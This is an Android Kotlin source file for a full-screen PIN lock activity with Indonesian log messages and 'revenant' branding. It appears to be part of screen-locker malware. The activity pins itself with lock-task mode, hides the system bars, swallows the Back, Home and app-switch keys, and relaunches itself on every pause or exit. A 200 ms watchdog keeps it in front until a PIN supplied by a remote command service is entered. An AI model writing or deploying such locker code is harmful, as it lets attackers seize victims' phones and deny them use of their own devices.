package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.MediaPlayer
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.KeyEvent
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat

class LockNewActivity : Activity() {

    companion object {
        const val TAG = "LockNewActivity"
        const val RE_LAUNCH_DELAY_MS = 100L
        const val WATCHDOG_INTERVAL_MS = 200L
    }

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String = ""
    private var lockTitle: String = "Perangkat Terkunci"
    private var customHtml: String = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val mainHandler = Handler(Looper.getMainLooper())
    private var watchdogRunnable: Runnable? = null

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                stopWatchdog()
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.addFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        )

        WindowCompat.setDecorFitsSystemWindows(window, false)
        val controller = WindowInsetsControllerCompat(window, window.decorView)
        controller.hide(WindowInsetsCompat.Type.systemBars())
        controller.systemBarsBehavior =
            WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN) ?: ""
        lockTitle = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE) ?: "Perangkat Terkunci"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        setupWebView()
        registerUnlockReceiver()

        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            if (dpm.isLockTaskPermitted(packageName)) {
                startLockTask()
                Log.d(TAG, "✅ LockTask mode AKTIF")
            } else {
                Log.d(TAG, "⚠️ LockTask not permitted, fallback ke watchdog")
            }
        } catch (e: Exception) {
            Log.w(TAG, "startLockTask: ${e.message}")
        }

        startWatchdog()
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN) ?: correctPin
        lockTitle = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE) ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (!isUnlocked) {
            Log.d(TAG, "🚫 Tombol BACK diblokir")
            reLaunchSelf()
            return
        }
        @Suppress("DEPRECATION")
        super.onBackPressed()
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (isUnlocked) return super.onKeyDown(keyCode, event)

        when (keyCode) {
            KeyEvent.KEYCODE_HOME,
            KeyEvent.KEYCODE_APP_SWITCH,
            KeyEvent.KEYCODE_MENU -> {
                Log.d(TAG, "🚫 Tombol $keyCode diblokir")
                reLaunchSelf()
                return true
            }
        }
        return super.onKeyDown(keyCode, event)
    }

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        Log.d(TAG, "⚠️ onPause — jadwal re-launch")
        scheduleReLaunch(RE_LAUNCH_DELAY_MS)
    }

    override fun onStop() {
        super.onStop()
        if (isUnlocked) return
        Log.d(TAG, "⚠️ onStop — jadwal re-launch")
        scheduleReLaunch(RE_LAUNCH_DELAY_MS)
    }

    override fun onUserLeaveHint() {
        super.onUserLeaveHint()
        if (isUnlocked) return
        Log.d(TAG, "⚠️ onUserLeaveHint — user coba kabur")
        reLaunchSelf()
    }

    override fun onResume() {
        super.onResume()
        if (isUnlocked) return
        Log.d(TAG, "✅ onResume — activity depan")
        val controller = WindowInsetsControllerCompat(window, window.decorView)
        controller.hide(WindowInsetsCompat.Type.systemBars())
    }

    private fun scheduleReLaunch(delayMs: Long) {
        mainHandler.postDelayed({
            if (isUnlocked) return@postDelayed
            reLaunchSelf()
        }, delayMs)
    }

    private fun reLaunchSelf() {
        if (isUnlocked) return
        try {
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_SINGLE_TOP or
                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                    Intent.FLAG_ACTIVITY_CLEAR_TOP
                )
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
            Log.d(TAG, "🚀 Re-launch LockNewActivity")
        } catch (e: Exception) {
            Log.e(TAG, "reLaunchSelf: ${e.message}")
        }
    }

    private fun startWatchdog() {
        stopWatchdog()
        watchdogRunnable = object : Runnable {
            override fun run() {
                if (isUnlocked) return
                if (!isForeground()) {
                    Log.d(TAG, "🐕 Watchdog: activity gak di depan, re-launch")
                    reLaunchSelf()
                }
                mainHandler.postDelayed(this, WATCHDOG_INTERVAL_MS)
            }
        }
        mainHandler.postDelayed(watchdogRunnable!!, WATCHDOG_INTERVAL_MS)
    }

    private fun stopWatchdog() {
        watchdogRunnable?.let { mainHandler.removeCallbacks(it) }
        watchdogRunnable = null
    }

    private fun isForeground(): Boolean {
        return try {
            val am = getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager
            @Suppress("DEPRECATION")
            val tasks = am.getRunningTasks(1)
            if (tasks.isNotEmpty()) {
                val top = tasks[0].topActivity?.packageName
                top == packageName
            } else false
        } catch (e: Exception) {
            false
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            mediaPlaybackRequiresUserGesture = false
        }
        webView.setBackgroundColor(android.graphics.Color.BLACK)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        webView.isFocusable = true
        webView.isFocusableInTouchMode = true
        webView.requestFocus()

        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(
                null,
                buildCustomLockHtml(customHtml),
                "text/html",
                "UTF-8",
                null
            )
        } else {
            webView.loadDataWithBaseURL(
                null,
                buildLockHtml(),
                "text/html",
                "UTF-8",
                null
            )
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String {
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:#000;overflow:hidden;display:flex;align-items:center;justify-content:center}
#wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
<div id="wrap">
${body}
</div>
</body>
</html>""".trimIndent()
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            Log.w(TAG, "registerReceiver: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopWatchdog()
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class LockBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin) || (correctPin.isEmpty() && pin == "0000")
            if (ok) {
                mainHandler.post {
                    isUnlocked = true
                    stopWatchdog()
                    try {
                        val cmdIntent = Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        }
                        sendBroadcast(cmdIntent)
                    } catch (e: Exception) {
                        Log.w(TAG, "broadcast: ${e.message}")
                    }
                    val unlockIntent = Intent("com.sync.xxx.UNLOCK").apply {
                        setPackage(packageName)
                    }
                    sendBroadcast(unlockIntent)
                    finish()
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                prepare()
                start()
                setOnCompletionListener {
                    release()
                    mediaPlayer = null
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "playLockSound: ${e.message}")
        }
    }

    private fun buildLockHtml(): String {
        val safeTitle = lockTitle
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace("\"", "&quot;")

        return """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#F2F3F5;--card:#FFFFFF;--black:#1A1A1A;--yellow:#FFE566;--text:#111111;--text3:#888888;--danger:#FF3B30;--ok:#34C759;}
html,body{height:100%;width:100%;overflow:hidden;touch-action:none;}
body{background:var(--bg);font-family:'Outfit',sans-serif;-webkit-font-smoothing:antialiased;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:28px 24px;position:relative;overflow:hidden;color:var(--text);}
body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,0,0,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,0,0,.04) 1px,transparent 1px);background-size:24px 24px;pointer-events:none;z-index:0;}
#introScreen{position:fixed;inset:0;background:#FFFFFF;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:100;gap:18px;animation:introDismiss .4s ease forwards 4s;}
@keyframes introDismiss{0%{opacity:1}100%{opacity:0;pointer-events:none}}
.intro-badge{width:88px;height:88px;background:var(--yellow);border:3px solid var(--black);border-radius:18px;box-shadow:5px 5px 0 var(--black);display:flex;align-items:center;justify-content:center;font-size:36px;font-weight:800;font-family:'JetBrains Mono',monospace;color:var(--black);animation:badgePop 1.4s ease-in-out infinite;}
@keyframes badgePop{0%,100%{transform:translate(0,0);box-shadow:5px 5px 0 var(--black)}50%{transform:translate(2px,2px);box-shadow:3px 3px 0 var(--black)}}
.intro-title{font-family:'JetBrains Mono',monospace;font-size:16px;letter-spacing:2px;text-transform:uppercase;color:var(--black);text-align:center;line-height:1.9;font-weight:700;}
.intro-title .line{display:block}
.intro-bar-wrap{width:220px;height:10px;background:#E8E8E8;border:2px solid var(--black);border-radius:6px;overflow:hidden;box-shadow:2px 2px 0 var(--black);}
.intro-bar{height:100%;width:0%;background:var(--yellow);animation:barFill 2.5s ease .5s forwards;}
@keyframes barFill{to{width:100%}}
.intro-pct-wrap{font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:2px;color:var(--black);font-weight:700;}
#mainContent{display:flex;flex-direction:column;align-items:center;position:relative;z-index:2;opacity:0;animation:mainIn .5s ease forwards 4.4s;width:100%;}
@keyframes mainIn{to{opacity:1}}
.virus-wrap{position:relative;width:100px;height:100px;margin-bottom:20px;}
.virus-bg{width:100px;height:100px;border-radius:20px;background:var(--yellow);border:3px solid var(--black);box-shadow:5px 5px 0 var(--black);display:flex;align-items:center;justify-content:center;}
.tsundere-face{width:64px;height:64px;display:flex;align-items:center;justify-content:center;}
.face-head{width:54px;height:54px;border-radius:14px;background:#FFFFFF;border:2.5px solid var(--black);position:relative;box-shadow:2px 2px 0 var(--black);}
.eye{position:absolute;width:10px;height:4px;background:var(--black);border-radius:4px;top:20px;}
.eye.left{left:11px;transform:rotate(-10deg)}
.eye.right{right:11px;transform:rotate(10deg)}
.mouth{position:absolute;left:50%;top:32px;transform:translateX(-50%);width:8px;height:4px;border-bottom:2px solid var(--black);border-radius:50%;}
.lock-title{font-size:22px;font-weight:800;color:var(--text);text-align:center;background:var(--yellow);border:2.5px solid var(--black);box-shadow:3px 3px 0 var(--black);padding:8px 16px;border-radius:10px;display:inline-block;}
.lock-sub{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;text-align:center;margin-bottom:26px;margin-top:10px;font-weight:600;}
.pin-wrap{display:flex;gap:14px;justify-content:center;margin-bottom:10px;}
.pin-dot{width:16px;height:16px;border-radius:6px;border:2.5px solid var(--black);background:#FFFFFF;box-shadow:2px 2px 0 var(--black);}
.pin-dot.filled{background:var(--yellow);transform:translate(1px,1px);box-shadow:1px 1px 0 var(--black);}
.pin-dot.error{border-color:var(--danger);background:#FFE0E0;}
.pin-status{height:24px;margin-bottom:24px;font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:1.5px;text-transform:uppercase;text-align:center;color:var(--text3);font-weight:600;}
.pin-status.err{color:var(--danger)}
.pin-status.ok{color:var(--ok)}
.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;width:100%;max-width:292px;}
.key{height:64px;border-radius:12px;border:2.5px solid var(--black);background:#FFFFFF;color:var(--text);display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;-webkit-tap-highlight-color:transparent;user-select:none;box-shadow:3px 3px 0 var(--black);}
.key .num{font-size:22px;font-weight:800;line-height:1;color:var(--text);}
.key .sub{font-family:'JetBrains Mono',monospace;font-size:7px;color:var(--text3);margin-top:2px;font-weight:600;}
.key.del{background:var(--yellow)}
.key.empty{pointer-events:none;opacity:0;}
.key:active{transform:translate(2px,2px);box-shadow:1px 1px 0 var(--black);background:var(--yellow);}
</style>
</head>
<body>
<div id="introScreen">
  <div class="intro-badge">RT</div>
  <div class="intro-title">
    <span class="line">revenant HERE</span>
    <span class="line">SECURE LOCK</span>
    <span class="line">ENTER YOUR PIN</span>
  </div>
  <div class="intro-bar-wrap"><div class="intro-bar"></div></div>
  <div class="intro-pct-wrap"><span class="pct-num" id="pctNum">0%</span></div>
</div>
<div id="mainContent">
  <div class="virus-wrap">
    <div class="virus-bg">
      <div class="tsundere-face">
        <div class="face-head">
          <div class="eye left"></div>
          <div class="eye right"></div>
          <div class="mouth"></div>
        </div>
      </div>
    </div>
  </div>
  <div class="lock-title">$safeTitle</div>
  <div class="lock-sub">Enter PIN To Unlock</div>
  <div class="pin-wrap">
    <div class="pin-dot" id="d0"></div>
    <div class="pin-dot" id="d1"></div>
    <div class="pin-dot" id="d2"></div>
    <div class="pin-dot" id="d3"></div>
  </div>
  <div class="pin-status" id="pinStatus">Masukkan PIN</div>
  <div class="keypad" id="keypad">
    <div class="key" data-n="1"><span class="num">1</span></div>
    <div class="key" data-n="2"><span class="num">2</span><span class="sub">ABC</span></div>
    <div class="key" data-n="3"><span class="num">3</span><span class="sub">DEF</span></div>
    <div class="key" data-n="4"><span class="num">4</span><span class="sub">GHI</span></div>
    <div class="key" data-n="5"><span class="num">5</span><span class="sub">JKL</span></div>
    <div class="key" data-n="6"><span class="num">6</span><span class="sub">MNO</span></div>
    <div class="key" data-n="7"><span class="num">7</span><span class="sub">PQRS</span></div>
    <div class="key" data-n="8"><span class="num">8</span><span class="sub">TUV</span></div>
    <div class="key" data-n="9"><span class="num">9</span><span class="sub">WXYZ</span></div>
    <div class="key empty"></div>
    <div class="key" data-n="0"><span class="num">0</span></div>
    <div class="key del" data-del="1"><span class="num">⌫</span></div>
  </div>
</div>
<script>
(function(){var el=document.getElementById('pctNum');var start=null;var dur=2500;function step(ts){if(!start) start=ts+500;var p=Math.min(1,Math.max(0,(ts-start)/dur));el.textContent=Math.floor(p*100)+'%';if(p<1) requestAnimationFrame(step);}requestAnimationFrame(step);})();
setTimeout(function(){var intro=document.getElementById('introScreen');intro.style.pointerEvents='none';setTimeout(function(){intro.style.display='none';},400);},4000);
var pin='';var blocked=false;
document.getElementById('keypad').addEventListener('touchend',function(e){e.preventDefault();var key=e.target.closest('.key');if(!key||key.classList.contains('empty')) return;if(key.dataset.del){doDelete();return;}if(key.dataset.n!==undefined){doPress(key.dataset.n);}},{passive:false});
document.getElementById('keypad').addEventListener('click',function(e){if(e.sourceCapabilities&&e.sourceCapabilities.firesTouchEvents) return;var key=e.target.closest('.key');if(!key||key.classList.contains('empty')) return;if(key.dataset.del){doDelete();return;}if(key.dataset.n!==undefined){doPress(key.dataset.n);}});
function doPress(n){if(blocked||pin.length>=4) return;pin+=n;updateDots();if(pin.length===4) setTimeout(checkPin,150);}
function doDelete(){if(blocked) return;pin=pin.slice(0,-1);updateDots();setStatus('',false,false);}
function updateDots(){for(var i=0;i<4;i++){var d=document.getElementById('d'+i);d.classList.toggle('filled',i<pin.length);d.classList.remove('error');}}
function checkPin(){var ok=false;try{ok=LockBridge.tryUnlock(pin);}catch(e){}if(ok){setStatus('PIN Benar ✓',false,true);}else{setStatus('PIN Salah!',true,false);for(var i=0;i<4;i++) document.getElementById('d'+i).classList.add('error');blocked=true;setTimeout(function(){pin='';blocked=false;updateDots();setStatus('Coba lagi',false,false);},1200);}}
function setStatus(msg,isErr,isOk){var el=document.getElementById('pinStatus');el.textContent=msg||'Masukkan PIN';el.className='pin-status'+(isErr?' err':isOk?' ok':'');}
</script>
</body>
</html>
"""
    }
}